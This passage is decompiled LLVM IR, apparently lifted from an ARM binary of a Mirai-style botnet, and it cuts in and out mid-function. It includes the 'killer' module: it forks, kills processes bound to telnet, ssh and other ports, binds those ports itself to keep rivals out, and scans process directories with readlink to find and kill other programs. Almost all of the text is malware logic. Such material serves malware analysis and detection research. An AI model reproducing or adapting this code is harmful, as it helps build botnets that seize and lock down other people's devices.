  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8404 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @r7, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp157 = icmp slt i32 %v0_cf54, 1
  %storemerge126 = select i1 %tmp157, i32 %., i32 1
  store i32 %storemerge126, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24724.70 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge126, 0
  store i32 %v0_cf54, i32* @global_var_24724.70, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d1f8, %dec_label_pc_d0e0, %entry
  %v1_cf8c = phi i32 [ %v2_d194, %dec_label_pc_d0e0 ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d1f8 ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v1_cfa4 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfb8 = load i32, i32* @r5, align 4
  store i32 %v0_cfb8, i32* %r2.global-to-local, align 4
  %v3_cfc0 = call i32 @socket(i32 2, i32 1, i32 %v0_cfb8)
  %v7_cfc4 = icmp eq i32 %v3_cfc0, -1
  store i32 %v3_cfc0, i32* @r4, align 4
  br i1 %v7_cfc4, label %dec_label_pc_cfec, label %dec_label_pc_cfd0

dec_label_pc_cfd0:                                ; preds = %dec_label_pc_cf90
  %v2_cfd4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cfd4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfdc = call i32 @bind(i32 %v3_cfc0, i32 %v2_cfd4, i32 16)
  %v0_cfe0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cfe8 = call i32 @listen(i32 %v0_cfe0, i32 1)
  br label %dec_label_pc_cfec

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd0
  %v1_cff0 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d004 = load i32, i32* @r5, align 4
  store i32 %v0_d004, i32* %r2.global-to-local, align 4
  %v3_d00c = call i32 @socket(i32 2, i32 1, i32 %v0_d004)
  %v7_d010 = icmp eq i32 %v3_d00c, -1
  store i32 %v3_d00c, i32* @r4, align 4
  br i1 %v7_d010, label %dec_label_pc_d038, label %dec_label_pc_d01c

dec_label_pc_d01c:                                ; preds = %dec_label_pc_cfec
  %v2_d020 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d020, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d028 = call i32 @bind(i32 %v3_d00c, i32 %v2_d020, i32 16)
  %v0_d02c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d034 = call i32 @listen(i32 %v0_d02c, i32 1)
  br label %dec_label_pc_d038

dec_label_pc_d038:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_d01c
  %v1_d040 = call i32 @killer_kill_by_port(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d058 = load i32, i32* @r5, align 4
  store i32 %v0_d058, i32* %r2.global-to-local, align 4
  %v3_d060 = call i32 @socket(i32 2, i32 1, i32 %v0_d058)
  %v7_d064 = icmp eq i32 %v3_d060, -1
  store i32 %v3_d060, i32* @r4, align 4
  br i1 %v7_d064, label %dec_label_pc_d08c, label %dec_label_pc_d070

dec_label_pc_d070:                                ; preds = %dec_label_pc_d038
  %v2_d074 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d074, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d07c = call i32 @bind(i32 %v3_d060, i32 %v2_d074, i32 16)
  %v0_d080 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d088 = call i32 @listen(i32 %v0_d080, i32 1)
  br label %dec_label_pc_d08c

dec_label_pc_d08c:                                ; preds = %dec_label_pc_d038, %dec_label_pc_d070
  %v2_d094 = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.74 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0ac = load i32, i32* @r5, align 4
  store i32 %v0_d0ac, i32* %r2.global-to-local, align 4
  %v3_d0b4 = call i32 @socket(i32 2, i32 1, i32 %v0_d0ac)
  %v7_d0b8 = icmp eq i32 %v3_d0b4, -1
  store i32 %v3_d0b4, i32* @r4, align 4
  br i1 %v7_d0b8, label %dec_label_pc_d0e0, label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d08c
  %v2_d0c8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d0c8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0d0 = call i32 @bind(i32 %v3_d0b4, i32 %v2_d0c8, i32 16)
  %v0_d0d4 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0dc = call i32 @listen(i32 %v0_d0d4, i32 1)
  br label %dec_label_pc_d0e0

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d08c, %dec_label_pc_d0c4
  %v1_d0e4 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d0ec = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_21c04.76 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24720.78 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d0ec, i32* %r2.global-to-local, align 4
  %v0_d0fc = load i32, i32* @r5, align 4
  %v1_d0fc = trunc i32 %v0_d0fc to i8
  %v3_d0fc = inttoptr i32 %v0_d0ec to i8*
  store i8 %v1_d0fc, i8* %v3_d0fc, align 1
  %v0_d104 = load i32, i32* @r5, align 4
  %v1_d104 = load i32, i32* %r3.global-to-local, align 4
  %v2_d104 = inttoptr i32 %v1_d104 to i32*
  store i32 %v0_d104, i32* %v2_d104, align 4
  %v0_d108 = load i32, i32* %r2.global-to-local, align 4
  %v1_d108 = load i32, i32* %r1.global-to-local, align 4
  %v2_d108 = inttoptr i32 %v1_d108 to i32*
  store i32 %v0_d108, i32* %v2_d108, align 4
  %v1_d10c = call i32 @table_unlock_val(i32 15)
  %v1_d114 = call i32 @table_unlock_val(i32 16)
  %v2_d118 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d118, i32* %r2.global-to-local, align 4
  %v0_d11c = load i32, i32* @r5, align 4
  store i32 %v0_d11c, i32* %r1.global-to-local, align 4
  %v2_d128 = inttoptr i32 %v0_d11c to i32*
  %v3_d128 = call i32 @table_retrieve_val(i32 15, i32* %v2_d128)
  %v1_d130 = add i32 %v2_d118, -44
  store i32 %v1_d130, i32* %r3.global-to-local, align 4
  store i32 %v3_d128, i32* %r1.global-to-local, align 4
  store i32 %v1_d130, i32* @r0, align 4
  %v2_d140 = inttoptr i32 %v1_d130 to i8*
  %v3_d140 = call i32 @util_strcpy(i8* %v2_d140, i32 %v3_d128)
  %v2_d148 = add i32 %v3_d140, %v1_d130
  store i32 %v2_d148, i32* @r4, align 4
  %v1_d14c = call i32 @__getpid(i32 %v3_d140)
  %v2_d154 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_d154, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d15c = trunc i32 %v1_d14c to i8
  %v4_d15c = call i32 @util_itoa(i8 %v3_d15c, i32 10, i32 %v2_d154)
  store i32 %v4_d15c, i32* %r1.global-to-local, align 4
  %v0_d164 = load i32, i32* @r4, align 4
  store i32 %v0_d164, i32* @r0, align 4
  %v2_d168 = inttoptr i32 %v0_d164 to i8*
  %v3_d168 = call i32 @util_strcpy(i8* %v2_d168, i32 %v4_d15c)
  %v0_d16c = load i32, i32* @r5, align 4
  store i32 %v0_d16c, i32* %r1.global-to-local, align 4
  %v1_d170 = load i32, i32* @r4, align 4
  %v2_d170 = add i32 %v1_d170, %v3_d168
  store i32 %v2_d170, i32* @r4, align 4
  %v2_d178 = inttoptr i32 %v0_d16c to i32*
  %v3_d178 = call i32 @table_retrieve_val(i32 16, i32* %v2_d178)
  store i32 %v3_d178, i32* %r1.global-to-local, align 4
  %v0_d180 = load i32, i32* @r4, align 4
  store i32 %v0_d180, i32* @r0, align 4
  %v2_d184 = inttoptr i32 %v0_d180 to i8*
  %v3_d184 = call i32 @util_strcpy(i8* %v2_d184, i32 %v3_d178)
  %v0_d188 = load i32, i32* @r5, align 4
  store i32 %v0_d188, i32* %r1.global-to-local, align 4
  store i32 %v3_d184, i32* @r6, align 4
  %v2_d194 = call i32 @__libc_open(i32 %v1_d130, i32 %v0_d188)
  %v7_d198 = icmp eq i32 %v2_d194, -1
  br i1 %v7_d198, label %dec_label_pc_cf80, label %dec_label_pc_d1a0

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d0e0
  %v1_d1a0 = call i32 @__GI___libc_close(i32 %v2_d194)
  %v1_d1a8 = call i32 @table_lock_val(i32 15)
  %v1_d1b0 = call i32 @table_lock_val(i32 16)
  store i32 ptrtoint (i32* @global_var_24720.78 to i32), i32* %r3.global-to-local, align 4
  %v2_d1bc = load i32, i32* @global_var_24720.78, align 4
  store i32 %v2_d1bc, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d1c8 = call i32 @readlink(i32 %v1_d130, i32 %v2_d1bc, i32 4095)
  %v7_d1cc = icmp eq i32 %v3_d1c8, -1
  br i1 %v7_d1cc, label %.thread9, label %bb160

bb160:                                            ; preds = %dec_label_pc_d1a0
  %v3_d1d4 = load i32, i32* @global_var_24720.78, align 4
  store i32 %v3_d1d4, i32* %r3.global-to-local, align 4
  %v1_d1d8 = load i32, i32* @r5, align 4
  %v2_d1d8 = trunc i32 %v1_d1d8 to i8
  %v5_d1d8 = add i32 %v3_d1d4, %v3_d1c8
  %v6_d1d8 = inttoptr i32 %v5_d1d8 to i8*
  store i8 %v2_d1d8, i8* %v6_d1d8, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d1a0, %bb160
  store i32 %v1_d130, i32* @r0, align 4
  %v0_d1e0 = load i32, i32* @r6, align 4
  %v1_d1e0 = load i32, i32* @r4, align 4
  %v1_d130.neg = sub i32 44, %v2_d118
  %v2_d1e0 = add i32 %v1_d130.neg, %v0_d1e0
  %v2_d1e4 = add i32 %v2_d1e0, %v1_d1e0
  store i32 %v2_d1e4, i32* @r1, align 4
  %v0_d1e8 = call i32 @util_zero()
  %v0_d1ec = load i32, i32* @r7, align 4
  store i32 %v0_d1ec, i32* @r4, align 4
  %v0_d1f0 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d2fc = ptrtoint i32* %stack_var_-148 to i32
  %v2_d300 = bitcast i32* %stack_var_-148 to i8*
  %v2_d34c = ptrtoint i32* %stack_var_-212 to i32
  %v2_d350 = bitcast i32* %stack_var_-212 to i8*
  %v2_d4ac = ptrtoint i32* %stack_var_-44 to i32
  %v2_d4bc = ptrtoint i32* %stack_var_-48 to i32
  %v2_d4d4 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d4e8 = ptrtoint i32* %stack_var_-8404 to i32
  br label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %dec_label_pc_d2c0, %.thread9
  %stack_var_-8412.0 = phi i32 [ %v0_d1f0, %.thread9 ], [ %stack_var_-8412.3, %dec_label_pc_d2c0 ]
  %v1_d1fc = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d208 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d20c = call i32 @__GI_opendir(i32 %v3_d208)
  store i32 %v1_d20c, i32* @sb, align 4
  %v2_d210 = icmp eq i32 %v1_d20c, 0
  br i1 %v2_d210, label %dec_label_pc_cf80, label %dec_label_pc_d218

dec_label_pc_d218:                                ; preds = %dec_label_pc_d1f8
  %v1_d21c = call i32 @table_lock_val(i32 15)
  %v0_d22080 = load i32, i32* @sb, align 4
  %v1_d22481 = inttoptr i32 %v0_d22080 to i32*
  %v2_d22482 = call i32 @__GI_readdir(i32* %v1_d22481)
  %v2_d22884 = icmp eq i32 %v2_d22482, 0
  br i1 %v2_d22884, label %dec_label_pc_d2c0, label %dec_label_pc_d230.preheader

dec_label_pc_d230.preheader:                      ; preds = %dec_label_pc_d218, %dec_label_pc_d220.backedge
  %v0_d23093 = phi i32 [ %v2_d224, %dec_label_pc_d220.backedge ], [ %v2_d22482, %dec_label_pc_d218 ]
  %stack_var_-8412.185 = phi i32 [ %stack_var_-8412.1.be, %dec_label_pc_d220.backedge ], [ %stack_var_-8412.0, %dec_label_pc_d218 ]
  br label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d230.preheader, %dec_label_pc_d2a8
  %v0_d240 = phi i32 [ %v2_d2b4, %dec_label_pc_d2a8 ], [ %v0_d23093, %dec_label_pc_d230.preheader ]
  %stack_var_-8412.2 = phi i32 [ %v1_d254, %dec_label_pc_d2a8 ], [ %stack_var_-8412.185, %dec_label_pc_d230.preheader ]
  %v1_d230 = add i32 %v0_d240, 11
  %v2_d230 = inttoptr i32 %v1_d230 to i8*
  %v3_d230 = load i8, i8* %v2_d230, align 1
  %v4_d230 = zext i8 %v3_d230 to i32
  %v1_d234 = add nsw i32 %v4_d230, -48
  store i32 %v1_d234, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d234, 9
  br i1 %tmp, label %dec_label_pc_d220.backedge, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d230
  store i32 %v1_d230, i32* @r6, align 4
  store i32 %v1_d230, i32* @r0, align 4
  %v1_d248 = call i32 @atol(i32 %v1_d230)
  %v0_d250 = load i32, i32* @r5, align 4
  %v1_d254 = add i32 %stack_var_-8412.2, 1
  store i32 %v1_d254, i32* %r1.global-to-local, align 4
  store i32 %v1_d248, i32* @r7, align 4
  %v5_d260 = icmp slt i32 %v0_d250, %v1_d248
  %v2_d2d0 = call i32 @__GI_time(i32* null)
  br i1 %v5_d260, label %dec_label_pc_d2cc, label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d240
  %v0_d26c = load i32, i32* @r4, align 4
  %v2_d26c = sub i32 %v2_d2d0, %v0_d26c
  %v7_d274 = icmp slt i32 %v2_d26c, 601
  br i1 %v7_d274, label %dec_label_pc_d27c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d264
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d220.backedge

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d264
  %v0_d27c = load i32, i32* @r7, align 4
  %v7_d280 = icmp slt i32 %v0_d27c, 401
  br i1 %v7_d280, label %dec_label_pc_d220.backedge, label %dec_label_pc_d284

dec_label_pc_d284:                                ; preds = %dec_label_pc_d27c
  %v3_d28c = zext i32 %v1_d254 to i64
  %v4_d28c = mul nuw i64 %v3_d28c, 3435973837
  %v3_d2901 = udiv i64 %v4_d28c, 34359738368
  %v3_d2943 = mul nuw nsw i64 %v3_d2901, 8
  %v3_d294 = trunc i64 %v3_d2943 to i32
  store i32 %v3_d294, i32* %r3.global-to-local, align 4
  %v2_d2985 = mul nuw nsw i64 %v3_d2901, 2
  %v2_d298 = trunc i64 %v2_d2985 to i32
  %v2_d29c = add i32 %v3_d294, %v2_d298
  store i32 %v2_d29c, i32* %r2.global-to-local, align 4
  %v9_d2a0 = icmp eq i32 %v1_d254, %v2_d29c
  br i1 %v9_d2a0, label %dec_label_pc_d2a8, label %dec_label_pc_d220.backedge

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d284
  %v1_d2ac = call i32 @sleep(i32 1)
  %v0_d2b0 = load i32, i32* @sb, align 4
  %v1_d2b4 = inttoptr i32 %v0_d2b0 to i32*
  %v2_d2b4 = call i32 @__GI_readdir(i32* %v1_d2b4)
  %v2_d2b8 = icmp eq i32 %v2_d2b4, 0
  br i1 %v2_d2b8, label %dec_label_pc_d2c0, label %dec_label_pc_d230

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d220.backedge, %dec_label_pc_d2a8, %dec_label_pc_d218
  %stack_var_-8412.3 = phi i32 [ %stack_var_-8412.0, %dec_label_pc_d218 ], [ %v1_d254, %dec_label_pc_d2a8 ], [ %stack_var_-8412.1.be, %dec_label_pc_d220.backedge ]
  %v0_d2c0 = load i32, i32* @sb, align 4
  %v1_d2c4 = inttoptr i32 %v0_d2c0 to i32*
  %v2_d2c4 = call i32 @__GI_closedir(i32* %v1_d2c4)
  br label %dec_label_pc_d1f8

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d240
  %v1_d2dc = call i32 @table_unlock_val(i32 15)
  %v1_d2e4 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2f0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d2f0, i32* %r1.global-to-local, align 4
  store i32 %v2_d2fc, i32* @r0, align 4
  %v3_d300 = call i32 @util_strcpy(i8* %v2_d300, i32 %v3_d2f0)
  %v2_d30c = add i32 %v3_d300, %v2_d2fc
  store i32 %v2_d30c, i32* %r5.global-to-local, align 4
  store i32 %v2_d30c, i32* @r0, align 4
  %v0_d314 = load i32, i32* @r6, align 4
  store i32 %v0_d314, i32* %r1.global-to-local, align 4
  %v2_d318 = inttoptr i32 %v2_d30c to i8*
  %v3_d318 = call i32 @util_strcpy(i8* %v2_d318, i32 %v0_d314)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d328 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d328, i32* %r1.global-to-local, align 4
  %v1_d330 = load i32, i32* %r5.global-to-local, align 4
  %v2_d330 = add i32 %v1_d330, %v3_d318
  store i32 %v2_d330, i32* @r0, align 4
  %v2_d334 = inttoptr i32 %v2_d330 to i8*
  %v3_d334 = call i32 @util_strcpy(i8* %v2_d334, i32 %v3_d328)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d340 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d340, i32* %r1.global-to-local, align 4
  store i32 %v2_d34c, i32* @r0, align 4
  %v3_d350 = call i32 @util_strcpy(i8* %v2_d350, i32 %v3_d340)
  store i32 %v2_d34c, i32* %r2.global-to-local, align 4
  %v2_d35c = add i32 %v3_d350, %v2_d34c
  store i32 %v2_d35c, i32* @r5, align 4
  %v0_d360 = load i32, i32* @r6, align 4
  store i32 %v0_d360, i32* %r1.global-to-local, align 4
  store i32 %v2_d35c, i32* @r0, align 4
  %v2_d368 = inttoptr i32 %v2_d35c to i8*
  %v3_d368 = call i32 @util_strcpy(i8* %v2_d368, i32 %v0_d360)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d368, i32* @r4, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 32, i32* null)
  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  %v0_d380 = load i32, i32* @r4, align 4
  %v1_d380 = load i32, i32* @r5, align 4
  %v2_d380 = add i32 %v1_d380, %v0_d380
  store i32 %v2_d380, i32* @r0, align 4
  %v2_d384 = inttoptr i32 %v2_d380 to i8*
  %v3_d384 = call i32 @util_strcpy(i8* %v2_d384, i32 %v3_d378)
  %v1_d38c = call i32 @table_lock_val(i32 15)
  %v1_d394 = call i32 @table_lock_val(i32 16)
  store i32 %v1_d130, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d3ac = call i32 @readlink(i32 %v2_d2fc, i32 %v1_d130, i32 4095)
  %v7_d3b0 = icmp eq i32 %v3_d3ac, -1
  store i32 %v3_d3ac, i32* @r5, align 4
  br i1 %v7_d3b0, label %dec_label_pc_d474, label %dec_label_pc_d3bc

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d2cc
  store i32 %v1_d130, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d3c4 = add i32 %v3_d3ac, %v1_d130
  %v5_d3c4 = inttoptr i32 %v4_d3c4 to i8*
  store i8 0, i8* %v5_d3c4, align 1
  %v1_d3cc = call i32 @table_unlock_val(i32 33)
  %v0_d3d0 = load i32, i32* @r4, align 4
  store i32 %v0_d3d0, i32* %r1.global-to-local, align 4
  %v2_d3d8 = inttoptr i32 %v0_d3d0 to i32*
